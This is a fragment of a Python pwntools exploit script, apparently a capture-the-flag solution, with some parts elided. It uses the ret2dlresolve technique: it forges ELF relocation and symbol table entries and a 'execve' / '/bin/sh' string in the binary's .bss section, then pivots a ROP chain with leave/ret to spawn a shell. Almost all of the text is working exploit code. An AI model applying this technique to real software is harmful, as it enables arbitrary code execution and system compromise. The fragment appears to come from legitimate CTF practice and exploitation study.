...
# inputs = [b'ex4722', b'ex4722', b'What? A swallow carrying a coconut?\x00']
...
# Dummy values for len
fake_jmprel = p32(0) + p32(0)  + p32(0)
fake_symtab = p32(0) + p32(0) + p32(0) + p32(0x12) + p32(0x35) + p32(0)

fake_table = exe.bss() + 0x800 + 0x24 + 0x24 + 0x40 
...
symtab_offset = fake_table +len(fake_jmprel) - symtab
str_offset = fake_table + len(fake_jmprel) + len(fake_symtab)+ - strtab

assert(symtab_offset // 16 == symtab_offset / 16)
# GOT loc, after got,  rinfo next, adding padding????
fake_jmprel = p32(exe.got.strncmp + 8) + p32( ((symtab_offset // 16))<<8  | 7)  + p32(0)
fake_symtab = p32(str_offset) + p32(0) + p32(0) + p32(0x12) + p32(0x35) + p32(0)


fake_str = b'execve\x00\x00/bin/sh\x00'
...
# leave ret, pops one
    ...
    # 0x10,
    0xdeadbeef,
    fake_table + len(fake_symtab) + len(fake_jmprel) + 8,
